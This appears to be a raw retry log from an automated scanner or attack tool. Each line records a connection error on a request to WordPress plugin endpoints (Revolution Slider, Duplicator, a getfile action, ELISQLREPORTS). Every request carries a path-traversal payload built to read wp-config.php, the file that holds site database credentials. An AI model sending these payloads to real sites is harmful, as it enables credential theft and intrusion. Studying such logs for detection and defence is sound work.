[2025-04-18 21:07:33] -- Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProtocolError(None)': /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
[2025-04-18 21:11:24] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
[2025-04-18 21:13:01] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
[2025-04-18 21:13:01] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
[2025-04-18 21:13:02] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
[2025-04-18 21:13:02] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
[2025-04-18 21:13:02] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=duplicator_download&file=../wp-config.php
[2025-04-18 21:13:02] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php
[2025-04-18 21:13:02] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php
[2025-04-18 21:13:02] -- Retrying (Retry(total=3, connect=None, read=None, redirect=None, status=None)) after connection broken by 'MustRedialError('Server unexpectedly closed the connection in-flight (connection dropped)')': /wp-admin/admin-ajax.php?action=getfile&/../../wp-config.php
[2025-04-18 21:13:03] -- Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProtocolError(None)': /wp-admin/admin.php?page=ELISQLREPORTS-settings&Download_SQL_Backup=../../../wp-config.php
